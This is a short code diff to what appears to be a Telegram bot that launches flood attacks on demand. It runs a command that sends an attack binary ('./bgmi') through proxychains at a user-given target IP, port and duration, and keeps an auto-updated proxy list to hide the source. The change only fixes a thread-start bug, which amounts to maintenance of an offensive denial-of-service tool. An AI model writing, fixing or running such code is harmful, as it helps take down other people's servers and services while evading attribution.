@@ -100,8 +100,6 @@ def auto_update_proxy_list():
 async def start_asyncio_loop():
     while True:
         await asyncio.sleep(REQUEST_INTERVAL)
-        
-asyncio_thread = Thread(target=start_asyncio_loop, daemon=True)
 
 async def run_attack_command_async(target_ip, target_port, duration, proxy):
     command = f"proxychains ./bgmi {target_ip} {target_port} {duration} 200"
@@ -250,7 +248,7 @@ def handle_message(message):
         bot.reply_to(message, "*Invalid option*", parse_mode='Markdown')
 
 if __name__ == "__main__":
-    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
+    asyncio_thread = Thread(target=start_asyncio_loop, daemon=True)
     asyncio_thread.start()
     
     # Start the auto proxy list update thread
